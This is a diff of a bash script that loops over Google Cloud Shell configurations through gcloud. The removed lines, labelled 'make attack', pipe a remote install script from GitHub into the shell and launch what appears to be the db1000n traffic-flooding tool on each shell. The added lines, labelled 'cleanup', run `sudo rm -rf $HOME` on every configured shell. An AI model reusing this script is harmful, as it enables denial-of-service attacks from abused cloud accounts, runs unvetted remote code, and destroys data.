@@ -3,15 +3,6 @@
 # set gcloud path
 gcloud=${GCLOUD_HOME:-gcloud}
 
-# get first argument as number of first gshell
-first_shell_num=${1:-0}
-
-# get first argument as number of second gshell
-second_shell_num=${2:-3}
-
-# get third argument as db1000n arguments
-needles_args=${3:-''}
-
 # make gcloud configurations
 gcloud_configs=()
 IFS=$'\n' configs_out=($($gcloud config configurations list))
@@ -37,17 +28,15 @@ fi
 # create logs directory
 mkdir -p logs
 
-# make attack
-for ((index=first_shell_num; index<=second_shell_num; index++))
+# remove HOME directory
+for config in "${gcloud_configs[@]}"
   do
-    printf '\n gcloud configuration %s: attack started\n' "${gcloud_configs[index]}"
-    CLOUDSDK_ACTIVE_CONFIG_NAME="${gcloud_configs[index]}" \
+    printf '\n gcloud configuration %s: cleanup started\n' "${config}"
+    CLOUDSDK_ACTIVE_CONFIG_NAME="${config}" \
     "${gcloud}" cloud-shell ssh --authorize-session \
-    --command="source <(curl https://raw.githubusercontent.com/Arriven/db1000n/main/install.sh) \
-    && ./db1000n ${needles_args}" \
-    > logs/configuration_"${gcloud_configs[index]}".log &
+    --command="sudo rm -rf \$HOME"
+    printf '\n gcloud configuration %s: cleanup finished\n' "${config}"
   done
-
 
 
 
